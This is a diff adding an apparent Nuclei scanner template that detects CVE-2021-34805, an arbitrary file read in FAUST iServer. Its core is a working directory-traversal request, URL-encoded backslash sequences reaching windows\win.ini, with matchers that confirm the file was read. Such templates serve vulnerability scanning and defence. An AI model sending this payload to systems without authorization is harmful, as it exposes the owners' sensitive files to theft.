@@ -1,0 +1,32 @@
+id: faust-iserver-file-read
+info:
+  name: FAUST iServer File Read Vulnerability (CVE-2021-34805)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    FAUST iServer 9.0.017.017.1- 9.0.018.018.4 has an arbitrary file read vulnerability, allowing unauthorized users to obtain sensitive information.
+  classification:
+    cvss-score: 7.5
+    cvss-metrics: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cve-id: CVE-2021-34805
+  tags: directory-traversal,file-read
+  reference:
+    - https://packetstormsecurity.com/files/165701/FAUST-iServer-9.0.018.018.4-Local-File-Inclusion.html
+
+http:
+  - raw:
+      - |
+        GET /%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bit app support"
+          - "extensions"
+          - "fonts"
+        condition: and
